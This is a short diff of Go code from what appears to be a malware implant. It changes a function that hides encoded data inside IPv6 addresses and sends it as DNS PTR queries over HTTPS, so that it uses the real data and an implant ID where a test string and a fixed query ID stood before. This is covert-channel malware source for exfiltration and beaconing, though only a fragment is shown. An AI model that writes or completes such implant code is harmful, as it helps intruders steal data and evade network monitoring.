@@ -58,10 +58,11 @@ func Ipv6ToPTR(ipv6 string) string {
 // Takes in an IP and ID
 // The IP is the encoded data and the ID should be the implant ID hex encoded
 // SendPTRRequest sends a DNS PTR request for a list of IPv6 addresses over HTTPS.
-func SendPTRRequest(impId string, ipv6List []string) bool {
+func SendPTRRequest(impId uint16, ipv6List []string) bool {
 
-	ipFormData := StringToIPv6List("7465:7374::")
-	ptrDomain := formatPTR(ipFormData)
+	// ipFormData := StringToIPv6List("7465:7374::")
+	// ptrDomain := formatPTR(ipFormData)
+	ptrDomain := formatPTR(ipv6List)
 
 	// Build the DNS packet
 	var dnsPacket bytes.Buffer
@@ -76,7 +77,8 @@ func SendPTRRequest(impId string, ipv6List []string) bool {
 		NSCount uint16
 		ARCount uint16
 	}{
-		ID:      0x04d2,    // 1234 in hex
+		// ID:      0x04d2,    // 1234 in hex
+		ID:      impId,
 		Flags:   0x0100,    // Standard recursive query
 		QDCount: ptrRCount, // 1 question
 	}
